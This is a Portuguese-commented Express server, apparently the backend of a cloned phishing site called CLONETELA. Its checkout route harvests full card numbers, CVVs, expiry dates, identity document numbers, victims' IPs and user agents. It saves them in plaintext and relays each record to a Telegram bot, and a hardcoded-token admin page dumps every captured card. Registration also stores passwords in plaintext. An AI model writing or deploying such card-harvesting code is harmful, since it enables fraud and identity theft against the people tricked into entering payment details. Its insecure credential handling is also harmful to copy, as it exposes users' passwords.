// server.js
// CLONETELA-main — servidor Express com:
// - Registro/Login persistindo em users.txt
// - Checkout persistindo em checkout.txt + envio ao Telegram
// - Rotas compatíveis com o front atual (/enviar, /login, /register)
// - Preparado para Railway (PORT e variáveis de ambiente)

const express = require('express');
const path = require('path');
const fs = require('fs');
const fetch = require('node-fetch'); // v2
const app = express();

// --------- Configuração básica ----------
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// CORS leve para facilitar dev/prod (ideal: ajustar origin conforme seu domínio)
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', req.headers.origin || '*');
  res.header('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  if (req.method === 'OPTIONS') return res.sendStatus(204);
  next();
});

// --------- Arquivos estáticos ----------
app.use(express.static(path.join(__dirname, 'site')));

// --------- Rota raiz ----------
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'site', 'index.html'));
});

// --------- Helpers de arquivo ----------
const USERS_FILE = path.join(__dirname, 'users.txt');
const CHECKOUT_FILE = path.join(__dirname, 'checkout.txt');

function ensureFile(filePath) {
  if (!fs.existsSync(filePath)) {
    fs.writeFileSync(filePath, '', 'utf8');
  }
}
ensureFile(USERS_FILE);
ensureFile(CHECKOUT_FILE);

// --------- Helpers diversos ----------
const ADMIN_TOKEN = process.env.ADMIN_TOKEN || 'MOUSEPADGAFANHOTO';

async function sendToTelegram(message) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!token || !chatId) {
    console.warn('⚠️ TELEGRAM_BOT_TOKEN/TELEGRAM_CHAT_ID não configurados. Pula envio.');
    return { ok: false, skipped: true, description: 'Missing Telegram ENV' };
  }

  const url = `https://api.telegram.org/bot${token}/sendMessage`;
  const body = {
    chat_id: chatId,
    text: message,
    parse_mode: 'HTML',
    disable_web_page_preview: true,
  };

  const resp = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body),
  });

  const data = await resp.json().catch(() => ({}));
  if (!resp.ok || data.ok === false) {
    const desc = data && data.description ? data.description : `HTTP ${resp.status}`;
    throw new Error(`Erro do Telegram: ${desc}`);
  }
  return data;
}

function nowISO() {
  // Mantém a data/hora consistente em produção
  return new Date().toISOString();
}

// ===================== REGISTRO =====================
// Espera JSON: { username, password, fullname }
app.post('/register', (req, res) => {
  try {
    const { username, password, fullname } = req.body || {};
    if (!username || !password || !fullname) {
      return res.json({ success: false, message: 'Campos obrigatórios não preenchidos.' });
    }

    ensureFile(USERS_FILE);
    const lines = fs.readFileSync(USERS_FILE, 'utf8').split('\n').filter(Boolean);
    const exists = lines.some(line => {
      const [savedUser] = line.split('|');
      return savedUser === username;
    });
    if (exists) {
      return res.json({ success: false, message: 'Usuário já existe.' });
    }

    const row = `${username}|${password}|${fullname}|${nowISO()}\n`;
    fs.appendFileSync(USERS_FILE, row, 'utf8');

    return res.json({ success: true, message: 'Registro efetuado com sucesso.' });
  } catch (err) {
    console.error('Erro /register:', err);
    return res.status(500).json({ success: false, message: 'Erro no servidor.' });
  }
});

// ===================== LOGIN =====================
// Espera JSON: { username, password }
app.post('/login', (req, res) => {
  try {
    const { username, password } = req.body || {};
    if (!username || !password) {
      return res.json({ success: false, message: 'Informe usuário e senha.' });
    }

    ensureFile(USERS_FILE);
    const lines = fs.readFileSync(USERS_FILE, 'utf8').split('\n').filter(Boolean);
    const found = lines.find(line => {
      const [savedUser, savedPass] = line.split('|');
      return savedUser === username && savedPass === password;
    });

    if (!found) {
      return res.json({ success: false, message: 'Credenciais inválidas.' });
    }

    return res.json({ success: true, message: 'Login ok.' });
  } catch (err) {
    console.error('Erro /login:', err);
    return res.status(500).json({ success: false, message: 'Erro no servidor.' });
  }
});

// ===================== CHECKOUT =====================
// Compatível com seu front (checkout.html) que chama fetch('.../enviar')
// Espera JSON: { cardNumber, cardcvvName, expiry, cardholderIdentificationNumber, cardholderNameC }
app.post('/enviar', async (req, res) => {
  try {
    const {
      cardNumber,
      cardcvvName,
      expiry,
      cardholderIdentificationNumber,
      cardholderNameC,
    } = req.body || {};

    // Validação mínima
    if (!cardNumber || !cardcvvName || !expiry || !cardholderIdentificationNumber || !cardholderNameC) {
      return res.status(400).send('Campos obrigatórios ausentes no checkout.');
    }

    // Monta linha para persistir
    const payload = {
      ts: nowISO(),
      cardNumber,
      cardcvvName,
      expiry,
      cardholderIdentificationNumber,
      cardholderNameC,
      ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress || '',
      ua: req.headers['user-agent'] || '',
    };

    // Salva em checkout.txt
    ensureFile(CHECKOUT_FILE);
    fs.appendFileSync(CHECKOUT_FILE, JSON.stringify(payload) + '\n', 'utf8');

    // Envia ao Telegram (se variáveis estiverem setadas)
    const msg =
      `<b>Checkout recebido</b>\n` +
      `💳 <b>Número:</b> ${cardNumber}\n` +
      `🔒 <b>CVV/Nome:</b> ${cardcvvName}\n` +
      `📅 <b>Validade:</b> ${expiry}\n` +
      `🪪 <b>Documento:</b> ${cardholderIdentificationNumber}\n` +
      `👤 <b>Titular:</b> ${cardholderNameC}\n` +
      `🕒 <b>TS:</b> ${payload.ts}\n` +
      `🌐 <b>IP:</b> ${payload.ip}`;

    try {
      await sendToTelegram(msg);
    } catch (tgErr) {
      console.error('Falha no envio ao Telegram:', tgErr.message);
      // Não falha o fluxo principal; apenas informa que não enviou
      return res.status(200).send('Checkout salvo. (Falha ao enviar ao Telegram; ver logs/ENV)');
    }

    return res.status(200).send('Checkout salvo e enviado ao Telegram.');
  } catch (err) {
    console.error('Erro /enviar:', err);
    return res.status(500).send('Erro no servidor.');
  }
});

// ===================== ADMIN =====================
// Visualizar checkouts com token simples
app.get('/admin/checkouts', (req, res) => {
  const token = req.query.token;
  if (token !== ADMIN_TOKEN) {
    return res.status(403).send('Acesso negado');
  }
  try {
    ensureFile(CHECKOUT_FILE);
    const data = fs.readFileSync(CHECKOUT_FILE, 'utf8');
    res.type('text/plain').send(data || '(vazio)');
  } catch {
    res.status(500).send('Erro ao ler checkout.txt');
  }
});

// Healthcheck básico para o Railway
app.get('/api/health', (_req, res) => {
  res.json({ ok: true, ts: nowISO() });
});

// --------- Sobe o servidor ----------
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Servidor rodando na porta ${PORT}`);
});
